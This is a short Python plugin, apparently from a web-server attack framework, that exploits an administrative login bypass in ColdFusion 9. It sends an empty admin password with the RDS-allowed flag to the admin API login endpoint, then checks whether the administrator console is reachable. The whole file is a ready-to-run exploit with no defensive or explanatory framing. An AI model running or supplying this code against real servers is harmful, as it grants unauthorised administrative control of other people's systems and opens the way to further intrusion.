from auxiliary import Auxiliary
from log import LOG
import utility


class Auxiliary:

    def __init__(self):
        self.name = "Administrative Login Bypass"
        self.versions = ["9.0"]
        self.show = False
        self.flag = 'cf-bypass'

    def check(self, fingerprint):
        if fingerprint.version in self.versions:
            return True

        return False

    def run(self, fingerengine, fingerprint):

        utility.Msg("Checking RDS...")
        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerengine.options.port)

        url = base + "/CFIDE/adminapi/administrator.cfc?method=login"

        payload = {'adminpassword':'',
                   'rdsPasswordAllowed':1
                   }

        rval = utility.requests_post(url, payload)
        if rval.status_code is 200:
            rval = rval.content
            if "true" in rval:
                rval = utility.requests_get(base + "/CFIDE/administrator/index.cfm")

                if rval.status_code is 200:
                    utility.Msg("Login bypass successful.", LOG.SUCCESS)
                else:
                    utility.Msg("System not vulnerable.", LOG.ERROR)
